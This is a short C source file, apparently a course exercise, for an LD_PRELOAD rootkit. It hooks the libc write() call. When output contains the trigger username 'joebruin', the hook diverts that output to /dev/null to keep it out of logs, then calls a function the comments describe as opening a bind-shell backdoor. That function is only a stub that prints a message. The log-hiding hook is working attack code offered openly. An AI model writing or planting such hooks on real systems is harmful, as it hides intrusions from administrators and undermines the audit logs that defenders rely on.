#include <dlfcn.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define TRIGGER_USERNAME "joebruin"

/* Call this function when a user logs in via ssh with the trigger username */
void start_bind4() {
  printf("The Hacking Has Begun\n");
}

/* Write your malicious syscall(s) here */
ssize_t write(int fildes, const void *buf, size_t nbytes) {
	ssize_t (*real_write) (int fildes, const void *buf, size_t nbytes);
	ssize_t result;

	real_write = dlsym(RTLD_NEXT, "write");

	/* Message doesn't conain trigger */
	if (strstr(buf, TRIGGER_USERNAME) == NULL) {
		return real_write(fildes, buf, nbytes);
	}

	/* write original bytes to /dev/null to hide ouput from log */
	fildes = open("/dev/null", O_WRONLY | O_APPEND);
	result = real_write(fildes, buf, nbytes);

	/* Open the bind shell backdoor */
	start_bind4();

	return result;
}
